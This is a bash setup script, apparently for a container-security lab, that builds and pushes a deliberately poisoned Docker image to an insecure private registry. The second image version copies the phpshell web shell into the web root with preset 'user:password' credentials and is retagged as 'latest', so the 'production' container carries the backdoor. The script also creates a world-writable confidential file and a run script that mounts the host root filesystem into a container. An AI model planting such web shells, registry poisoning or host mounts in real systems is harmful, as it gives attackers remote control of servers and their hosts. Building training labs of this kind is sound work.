#!/bin/bash

echo 'DOCKER_OPTS="--insecure-registry 192.168.33.19:5000"' >> /etc/default/docker
echo '{ "insecure-registries":["192.168.33.19:5000"] }' > /etc/docker/daemon.json

systemctl restart docker

sudo apt-get install -y unzip
cd /tmp/
cd poisoned-image

echo '[users]' >> phpshell-2.4/config.php
echo 'user = "sha1:69284fa:f9850d73ad40b48a1ccd2bda4b44a0347fa2e17b"' >> phpshell-2.4/config.php
echo "user:password" >> phpshell-2.4/users.txt


echo "FROM php:5.6.25-apache" > Dockerfile
echo "COPY index.php /var/www/html/index.php" >> Dockerfile
echo "RUN echo 'This is a document with confidential information! It is not allowed to be seen by public eyes.' > /var/www/html/confidential.txt"  >> Dockerfile
echo "RUN chmod 777 /var/www/html/confidential.txt" >> Dockerfile
docker build -t 192.168.33.19:5000/sample-application:5.0 .
docker push 192.168.33.19:5000/sample-application:5.0
docker tag 192.168.33.19:5000/sample-application:5.0 192.168.33.3:5000/sample-application:latest

echo "COPY phpshell-2.4 /var/www/html" >> Dockerfile
docker build -t 192.168.33.19:5000/sample-application:5.1 .
docker push 192.168.33.19:5000/sample-application:5.1
docker tag 192.168.33.19:5000/sample-application:5.1 192.168.33.3:5000/sample-application:latest
docker push 192.168.33.19:5000/sample-application:latest


docker rmi 192.168.33.19:5000/sample-application:5.0
docker rmi 192.168.33.19:5000/sample-application:5.1
docker rmi 192.168.33.19:5000/sample-application:latest

cat > /home/ubuntu/force-pike.bash << EOF
echo "Pulling and running 192.168.33.19:5000/sample-application:5.0"
sudo docker run -d -p 8096:80 --name sample-application-testing 192.168.33.19:5000/sample-application:5.0
echo "Pulling and running 192.168.33.19:5000/sample-application:latest" 
sudo docker run -d -p 8097:80 --name sample-application-production 192.168.33.19:5000/sample-application:latest
EOF
chmod 755 /home/ubuntu/force-pike.bash

echo "sudo docker run -d -p 8098:80 --name thumbnailer -v /:/host 192.168.33.19:5000/sample-application:latest" > /home/ubuntu/22lr.bash
chmod 755 /home/ubuntu/22lr.bash


